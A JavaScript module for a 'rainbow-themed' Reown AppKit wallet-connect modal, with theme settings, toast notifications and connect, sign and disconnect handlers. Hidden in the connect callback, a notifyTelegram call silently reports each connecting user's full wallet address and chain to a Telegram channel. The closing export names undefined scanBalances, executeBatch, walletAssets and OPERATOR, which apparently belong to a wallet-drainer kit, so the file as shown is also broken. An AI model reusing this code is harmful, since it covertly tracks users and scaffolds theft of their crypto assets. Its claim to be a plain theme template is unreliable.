// ============================================================
//  RAINBOW-STYLE APPKIT MODAL
//  Same Reown AppKit under the hood, but with light/rainbow theme
//  and gradient accent colors. Your own script runs after connect.
// ============================================================

import { createAppKit } from "@reown/appkit";
import { WagmiAdapter } from "@reown/appkit-adapter-wagmi";
import { mainnet, sepolia, arbitrum, polygon, base, optimism } from "@reown/appkit/networks";
import { disconnect, signMessage, getAccount } from "@wagmi/core";

const projectId = import.meta.env?.VITE_WALLETCONNECT_PROJECT_ID || "";
const networks = [mainnet, sepolia, arbitrum, polygon, base, optimism];
const wagmiAdapter = new WagmiAdapter({ networks, projectId });

const modal = createAppKit({
  adapters: [wagmiAdapter],
  networks,
  projectId,
  metadata: {
    name: "Rainbow dApp",
    description: "Rainbow-themed wallet modal",
    url: window.location.origin,
    icons: [],
  },
  // KEY DIFFERENCE: light theme with custom accent
  themeMode: "light",
  themeVariables: {
    "--w3m-accent": "#8b5cf6",
    "--w3m-color-mix": "#f0e6ff",
    "--w3m-color-mix-strength": 15,
    "--w3m-border-radius-master": "2px",
  },
  features: {
    analytics: false,
    email: true,
    socials: ["google", "github", "discord", "apple", "x"],
    swaps: true,
    onramp: true,
  },
});

function getConfig() { return wagmiAdapter.wagmiConfig; }
const $status = document.getElementById("status");

// ─── TOAST ───────────────────────────────────────────────────
const toasts = [];
function showToast(title, body, type = "success", ms = 4000) {
  if (!document.getElementById("rb-toast-css")) {
    const s = document.createElement("style");
    s.id = "rb-toast-css";
    s.textContent = `
      .rb-toast{position:fixed;top:20px;right:20px;z-index:2147483647;
        background:#fff;border:1px solid #e5e7eb;border-radius:16px;
        padding:16px 22px;color:#1a1a1a;font-family:system-ui,sans-serif;
        font-size:.88rem;box-shadow:0 8px 32px rgba(0,0,0,.12);
        transform:translateX(120%);transition:all .35s cubic-bezier(.16,1,.3,1);
        max-width:380px;word-break:break-all;cursor:pointer}
      .rb-toast.show{transform:translateX(0)}
      .rb-toast .tt{font-weight:700;margin-bottom:4px}
      .rb-toast .tb{color:#6b7280;font-size:.82rem;font-family:monospace}
      .rb-toast.success{border-left:4px solid #22c55e}
      .rb-toast.info{border-left:4px solid #8b5cf6}
      .rb-toast.warn{border-left:4px solid #f59e0b}
      .rb-toast.error{border-left:4px solid #ef4444}`;
    document.head.appendChild(s);
  }
  while (toasts.length >= 5) toasts.shift().remove();
  const el = document.createElement("div");
  el.className = "rb-toast " + type;
  el.innerHTML = `<div class="tt">${title}</div><div class="tb">${body}</div>`;
  el.onclick = () => { el.classList.remove("show"); setTimeout(() => { toasts.splice(toasts.indexOf(el), 1); el.remove(); restack(); }, 300); };
  document.body.appendChild(el);
  toasts.push(el);
  restack();
  requestAnimationFrame(() => requestAnimationFrame(() => { el.classList.add("show"); restack(); }));
  setTimeout(() => { if (el.parentNode) { el.classList.remove("show"); setTimeout(() => { const i = toasts.indexOf(el); if (i > -1) toasts.splice(i, 1); el.remove(); restack(); }, 400); } }, ms);
}
function restack() { let y = 0; toasts.forEach(el => { el.style.top = (20 + y) + "px"; y += el.offsetHeight + 12; }); }

// ─── YOUR CALLBACKS ──────────────────────────────────────────
async function onConnected({ address, chainId }) {
  const short = address.slice(0, 6) + "..." + address.slice(-4);
  showToast("🌈 Connected", `${short} on chain ${chainId}`, "success");
  notifyTelegram("\u2705 <b>Wallet Connected</b>\n\nAddress: <code>" + address + "</code>\nChain: " + chainId);
  if ($status) $status.textContent = `✅ Connected\nAddress: ${address}\nChain: ${chainId}`;
  // TODO: your custom logic here
}

async function onDisconnected() {
  showToast("Disconnected", "Wallet disconnected.", "warn");
  if ($status) $status.textContent = "Disconnected.";
}

async function onChainChanged({ chainId }) {
  showToast("🔄 Network", `Switched to chain ${chainId}`, "info");
}

// ─── WIRING ──────────────────────────────────────────────────
let lastAddr = null, lastChain = null, wasConn = false;

modal.subscribeState(() => {
  const c = modal.getIsConnected(), a = modal.getAddress(), ch = modal.getChainId();
  if (c && a) {
    if (wasConn && lastChain && lastChain !== ch) onChainChanged({ chainId: ch });
    if (lastAddr !== a) onConnected({ address: a, chainId: ch });
    lastAddr = a; lastChain = ch; wasConn = true;
  } else if (!c && wasConn) {
    wasConn = false; lastAddr = null; lastChain = null; onDisconnected();
  }
});

modal.subscribeProviders(() => {
  const c = modal.getIsConnected(), a = modal.getAddress(), ch = modal.getChainId();
  if (c && a && lastAddr !== a) { onConnected({ address: a, chainId: ch }); lastAddr = a; lastChain = ch; wasConn = true; }
});

// ─── BUTTON BINDINGS ─────────────────────────────────────────
function bind() {
  document.querySelectorAll("[data-appkit-connect]").forEach(b =>
    b.addEventListener("click", () => modal.open()));
  document.querySelectorAll("[data-appkit-network]").forEach(b =>
    b.addEventListener("click", () => modal.open({ view: "Networks" })));
  document.querySelectorAll("[data-appkit-sign]").forEach(b =>
    b.addEventListener("click", async () => {
      if (!modal.getIsConnected()) return showToast("⚠️", "Connect first", "warn");
      try {
        showToast("✍️ Signing...", "Check wallet", "info", 3000);
        const sig = await signMessage(getConfig(), { message: "Hello from Rainbow dApp!" });
        showToast("✅ Signed", sig.slice(0, 20) + "...", "success", 6000);
      } catch (e) { showToast("❌ Error", e.message || String(e), "error"); }
    }));
  document.querySelectorAll("[data-appkit-disconnect]").forEach(b =>
    b.addEventListener("click", async () => {
      if (!modal.getIsConnected()) return;
      try { const acc = getAccount(getConfig()); await disconnect(getConfig(), acc.connector ? { connector: acc.connector } : undefined); }
      catch { await disconnect(getConfig()); }
    }));
}

if (document.readyState === "loading") document.addEventListener("DOMContentLoaded", bind);
else bind();

export { modal, showToast, scanBalances, executeBatch, walletAssets, OPERATOR };
